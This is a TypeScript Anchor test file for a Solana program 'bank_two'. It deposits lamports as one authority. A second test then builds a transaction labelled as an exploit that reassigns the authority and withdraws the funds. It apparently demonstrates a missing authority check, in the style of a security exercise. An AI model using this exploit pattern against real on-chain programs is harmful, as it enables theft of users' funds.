import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { BankTwo } from "../target/types/bank_two";
import { assert } from "chai";

describe("bank_two", () => {
  const provider = anchor.AnchorProvider.env();
  const connection = provider.connection;
  const wallet = provider.wallet as anchor.Wallet;
  anchor.setProvider(provider);

  const program = anchor.workspace.BankTwo as Program<BankTwo>;

  const authority = new anchor.web3.Keypair();
  const amount = 1_000_000; // 1million lamports

  before(async () => {
    const transferAmount = 1 * anchor.web3.LAMPORTS_PER_SOL;
    const transferTx = new anchor.web3.Transaction().add(
      anchor.web3.SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: authority.publicKey,
        lamports: transferAmount,
      })
    );
    await provider.sendAndConfirm(transferTx);
  });

  it("Deposit", async () => {
    const transaction = await program.methods
      .deposit(new anchor.BN(amount))
      .accounts({ authority: authority.publicKey })
      .transaction();

    const transactionSignature = await anchor.web3.sendAndConfirmTransaction(
      connection,
      transaction,
      [authority],
      { commitment: "confirmed" }
    );
    console.log("Your transaction signature", transactionSignature);
  });

  it("withdraw", async () => {
    const updateAuthorityIx = await program.methods
      .updateAuthority()
      .accounts({ newAuthority: wallet.publicKey })
      .instruction()

    const withdrawExploitInstruction = await program.methods
      .withdraw(new anchor.BN(amount))
      .accounts({ authority: wallet.publicKey })
      .instruction()

    const Exploittxn = new anchor.web3.Transaction().add(
      updateAuthorityIx,
      withdrawExploitInstruction,
    )

    const exploitSignature = await anchor.web3.sendAndConfirmTransaction(
      connection,
      Exploittxn,
      [wallet.payer],
      {commitment:"confirmed"}
    )

    console.log("⚠️ exploit signautre : ", exploitSignature)
  })

});
